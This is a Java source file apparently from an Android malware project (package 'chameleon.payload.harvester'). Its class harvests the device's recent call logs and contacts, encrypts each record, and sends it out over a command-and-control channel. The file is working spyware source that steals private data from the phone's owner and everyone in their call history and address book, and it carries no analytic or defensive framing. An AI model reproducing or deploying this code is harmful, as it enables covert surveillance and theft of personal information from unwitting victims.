package com.chameleon.payload.harvester;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import com.chameleon.payload.util.Crypto;
import org.json.JSONObject;

public class CallLogHarvester {
    private static final String TAG = "CallLogHarvester";
    private final Context context;

    public CallLogHarvester(Context context) {
        this.context = context;
    }

    public void collectCallLogs() {
        try {
            Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://call_log/calls"),
                null, null, null, "date DESC LIMIT 100"
            );
            if (cursor == null) return;

            while (cursor.moveToNext()) {
                String number = getString(cursor, "number");
                String name = getString(cursor, "name");
                String type = getString(cursor, "type");
                long date = getLong(cursor, "date");
                long duration = getLong(cursor, "duration");

                String typeLabel;
                switch (type != null ? type : "-1") {
                    case "1": typeLabel = "incoming"; break;
                    case "2": typeLabel = "outgoing"; break;
                    case "3": typeLabel = "missed"; break;
                    default: typeLabel = "unknown";
                }

                JSONObject data = new JSONObject();
                data.put("number", number != null ? number : "");
                data.put("name", name != null ? name : "");
                data.put("type", typeLabel);
                data.put("date", date);
                data.put("duration", duration);

                byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
                com.chameleon.payload.PayloadEntry.getC2().sendData("call_log", encrypted);
            }
            cursor.close();
            Log.i(TAG, "Call logs collected");
        } catch (Exception e) {
            Log.e(TAG, "Call log collection error", e);
        }
    }

    public void collectContacts() {
        try {
            Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://contacts/phones"),
                null, null, null, "display_name ASC"
            );
            if (cursor == null) return;

            int count = 0;
            while (cursor.moveToNext() && count < 200) {
                String displayName = getString(cursor, "display_name");
                String phoneNumber = getString(cursor, "number");

                JSONObject data = new JSONObject();
                data.put("name", displayName != null ? displayName : "");
                data.put("phone", phoneNumber != null ? phoneNumber : "");

                byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
                com.chameleon.payload.PayloadEntry.getC2().sendData("contact", encrypted);
                count++;
            }
            cursor.close();
            Log.i(TAG, "Contacts collected: " + count);
        } catch (Exception e) {
            Log.e(TAG, "Contact collection error", e);
        }
    }

    private String getString(Cursor c, String col) {
        try { return c.getString(c.getColumnIndexOrThrow(col)); } catch (Exception e) { return null; }
    }

    private long getLong(Cursor c, String col) {
        try { return c.getLong(c.getColumnIndexOrThrow(col)); } catch (Exception e) { return 0; }
    }
}
